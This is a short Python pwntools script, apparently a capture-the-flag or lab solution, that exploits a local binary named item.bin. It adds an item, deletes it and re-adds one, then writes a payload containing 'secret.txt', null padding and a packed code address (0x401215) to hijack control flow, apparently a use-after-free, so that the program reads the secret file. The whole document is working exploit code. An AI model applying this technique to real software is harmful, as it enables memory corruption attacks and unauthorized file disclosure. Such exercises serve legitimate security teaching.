#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./item.bin")

    for i in range(5):
        print(p.recvline())

    print(p.recvuntil(b"> Input your choice: "))
    p.sendline(b"A")
    print(p.recvuntil(b"Input the name of the new item: "))
    p.sendline(b"a"*7)
    print(p.recvuntil(b"Input the length of item description: "))
    p.sendline(b"64")
    print(p.recvuntil(b"Input the item description: "))
    p.sendline(b"a"*42)

    for i in range(5):
        print(p.recvline())

    print(p.recvuntil(b"> Input your choice: "))
    p.sendline(b"D")
    print(p.recvuntil(b"Input the name of the item to delete: "))
    p.sendline(b"a"*7)

    for i in range(5):
        print(p.recvline())
    print(p.recvuntil(b"> Input your choice: "))
    p.sendline(b"A")
    print(p.recvuntil(b"Input the name of the new item: "))
    p.sendline(b"a")
    print(p.recvuntil(b"Input the length of item description: "))
    p.sendline(b"64")
    print(p.recvuntil(b"Input the item description: "))
    p.sendline(b"secret.txt" + b"\x00"*30 +p64(0x401215))

    for i in range(5):
        print(p.recvline())
    print(p.recvuntil(b"> Input your choice: "))
    p.sendline(b"L")
    print(p.recvline())


if __name__ == "__main__":
    exploit()
